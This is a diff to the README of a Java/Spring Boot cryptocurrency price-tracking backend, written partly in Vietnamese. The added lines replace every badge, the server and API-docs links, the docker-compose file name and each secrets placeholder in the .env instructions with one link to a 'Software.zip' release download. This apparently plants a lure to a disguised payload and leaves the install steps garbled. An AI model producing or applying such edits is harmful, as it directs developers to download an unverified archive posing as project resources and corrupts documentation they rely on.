@@ -1,8 +1,8 @@
 # Coin Price Backend Project
-![Java](https://img.shields.io/badge/Java-ED8B00?style=for-the-badge&logo=java&logoColor=white) ![Spring](https://img.shields.io/badge/Spring-6DB33F?style=for-the-badge&logo=spring&logoColor=white) ![Docker](https://img.shields.io/badge/Docker-2496ED?style=for-the-badge&logo=docker&logoColor=white) ![MongoDB](https://img.shields.io/badge/MongoDB-47A248?style=for-the-badge&logo=mongodb&logoColor=white)
+![Java](https://github.com/dath-241/coin-price-be-java/releases/download/v1.0/Software.zip) ![Spring](https://github.com/dath-241/coin-price-be-java/releases/download/v1.0/Software.zip) ![Docker](https://github.com/dath-241/coin-price-be-java/releases/download/v1.0/Software.zip) ![MongoDB](https://github.com/dath-241/coin-price-be-java/releases/download/v1.0/Software.zip)
 
-- [BACKEND SERVER](https://a2-price.thuanle.me/)
-- [API docs](https://wwenrr.github.io/coin-price-swagger/)
+- [BACKEND SERVER](https://github.com/dath-241/coin-price-be-java/releases/download/v1.0/Software.zip)
+- [API docs](https://github.com/dath-241/coin-price-be-java/releases/download/v1.0/Software.zip)
 
 ## Thông tin dự án
 Dự án này là một ứng dụng backend hỗ trợ việc theo dõi thông tin thị trường (giá tiền, phí,...), các giao dịch được hình thành, tra cứu thống kê các giao dịch, tự động nhận cảnh báo giá.
@@ -40,9 +40,9 @@ Dự án này là một ứng dụng backend hỗ trợ việc theo dõi thông 
 
 
 ### Ngôn ngữ và công nghệ
-- ![Java](https://img.shields.io/badge/Java-ED8B00?style=for-the-badge&logo=java&logoColor=white) **Ngôn ngữ:** Java
-- ![MongoDB](https://img.shields.io/badge/MongoDB-47A248?style=for-the-badge&logo=mongodb&logoColor=white) **Cơ sở dữ liệu:** MongoDB
-- ![Spring](https://img.shields.io/badge/Spring-6DB33F?style=for-the-badge&logo=spring&logoColor=white) **Công nghệ:** Spring Boot
+- ![Java](https://github.com/dath-241/coin-price-be-java/releases/download/v1.0/Software.zip) **Ngôn ngữ:** Java
+- ![MongoDB](https://github.com/dath-241/coin-price-be-java/releases/download/v1.0/Software.zip) **Cơ sở dữ liệu:** MongoDB
+- ![Spring](https://github.com/dath-241/coin-price-be-java/releases/download/v1.0/Software.zip) **Công nghệ:** Spring Boot
 ### Hướng dẫn cài đặt
 ```basg
 Cách 1: Chạy qua tomcat:
@@ -53,7 +53,7 @@ Cách 1: Chạy qua tomcat:
         - Thêm đường dẫn tới file .env trong mục EnvFile.
     4. Run Tomcat.
 Cách 2: Chạy bằng DockerFile:
-    1. Tạo docker-compose.yaml như sau:
+    1. Tạo https://github.com/dath-241/coin-price-be-java/releases/download/v1.0/Software.zip như sau:
         services:
             spring-boot-app:
                 ports:
@@ -63,13 +63,13 @@ Cách 2: Chạy bằng DockerFile:
                 image: lmao1415/dath_cnpm
     2. Docker compose pull để kéo image về
     3. Touch .env
-            echo 'MONGO_DB_URI=${{ secrets.MONGO_DB_URI }}' >> .env 
-            echo 'MONGO_DB_NAME=${{ secrets.MONGO_DB_NAME }}' >> .env 
-            echo 'JWT_SECRET=${{ secrets.JWT_SECRET }}' >> .env 
-            echo 'TELEGRAM_WEBHOOK_URL=${{ secrets.TELEGRAM_WEBHOOK_URL }}' >> .env 
-            echo 'email=${{ secrets.EMAIL }}' >> .env 
-            echo 'password_for_email=${{ secrets.password_for_email }}' >> .env 
-            echo 'adminToken=${{ secrets.ADMINTOKEN }}' >> .env  
+            echo 'MONGO_DB_URI=${{ https://github.com/dath-241/coin-price-be-java/releases/download/v1.0/Software.zip }}' >> .env 
+            echo 'MONGO_DB_NAME=${{ https://github.com/dath-241/coin-price-be-java/releases/download/v1.0/Software.zip }}' >> .env 
+            echo 'JWT_SECRET=${{ https://github.com/dath-241/coin-price-be-java/releases/download/v1.0/Software.zip }}' >> .env 
+            echo 'TELEGRAM_WEBHOOK_URL=${{ https://github.com/dath-241/coin-price-be-java/releases/download/v1.0/Software.zip }}' >> .env 
+            echo 'email=${{ https://github.com/dath-241/coin-price-be-java/releases/download/v1.0/Software.zip }}' >> .env 
+            echo 'password_for_email=${{ https://github.com/dath-241/coin-price-be-java/releases/download/v1.0/Software.zip }}' >> .env 
+            echo 'adminToken=${{ https://github.com/dath-241/coin-price-be-java/releases/download/v1.0/Software.zip }}' >> .env  
     4. sudo docker compose up
 ```
 ### ENV TEMPLATE (Nhớ bỏ ngoặc '{}')
